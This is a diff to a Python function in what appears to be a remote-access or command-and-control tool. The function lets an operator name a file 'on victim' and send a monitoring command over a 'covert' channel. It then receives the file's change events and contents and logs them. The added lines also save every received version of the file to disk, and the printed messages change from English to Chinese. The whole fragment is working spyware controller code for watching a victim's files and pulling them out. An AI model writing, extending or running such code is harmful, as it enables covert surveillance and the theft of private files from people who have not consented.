@@ -297,19 +297,12 @@ def cmd_monitor_file(comm: Commander):
     file_path = input("Enter file path on victim to monitor: ").strip()
     date_str = datetime.now().strftime("%Y-%m-%d")
     log_filename = f"{date_str}.log"
-    print(f"Start Monitor ：{file_path}。Log file save to {log_filename}，Ctrl+C Stop")
+    print(f"[*] 开始监控文件：{file_path}。日志保存为 {log_filename}，按 Ctrl+C 停止。")
     comm.send_covert_message(f"CMD_MON_FILE:{file_path}".encode())
 
     with open(log_filename, "a", encoding="utf-8") as logfile:
         try:
             buffer = ""
-
-            first = comm.recv_covert_message()
-            print(first)
-            if first:
-                buffer += first.decode('utf-8', errors='ignore')
-            print(buffer)
-
             while True:
                 chunk = comm.recv_covert_message()
                 if chunk is None:
@@ -318,32 +311,39 @@ def cmd_monitor_file(comm: Commander):
 
                 while '\n' in buffer:
                     line, buffer = buffer.split('\n', 1)
-
                     start = line.find('{')
                     end = line.rfind('}')
                     if start == -1 or end == -1:
                         continue
-
-                    json_str = line[start:end + 1]
                     try:
-                        msg = json.loads(json_str)
+                        msg = json.loads(line[start:end+1])
                     except json.JSONDecodeError:
                         continue
 
-                    # 打印并记录
-                    ts = msg.get('timestamp', '')
+                    ts = msg.get('timestamp', datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                     typ = msg.get('type', '')
                     path = msg.get('path', '')
-                    print(f"[{ts}] Event: {typ} | File: {path}")
-                    if 'content' in msg:
-                        print(msg['content'])
-                    print('-' * 40)
+                    content = msg.get('content', '')
+
+                    print(f"[{ts}] 事件: {typ} | 文件: {path}")
+                    print(content)
+                    print("-" * 40)
 
                     logfile.write(json.dumps(msg, ensure_ascii=False) + "\n")
                     logfile.flush()
 
+                    basename = os.path.basename(path)
+                    ts_file = ts.replace(' ', '_').replace(':', '')
+                    save_name = f"{ts_file}_{basename}"
+                    try:
+                        with open(save_name, "w", encoding="utf-8", errors="ignore") as out:
+                            out.write(content)
+                        print(f"[*] 已保存最新版本到：{save_name}")
+                    except Exception as e:
+                        print(f"[!] 保存文件 {save_name} 失败：{e}")
+
         except KeyboardInterrupt:
-            print("\n[*] Stopping File Watching")
+            print("\n[*] 停止文件监控。")
             comm.send_covert_message(b"CMD_STOP_MON_FILE")
 
 
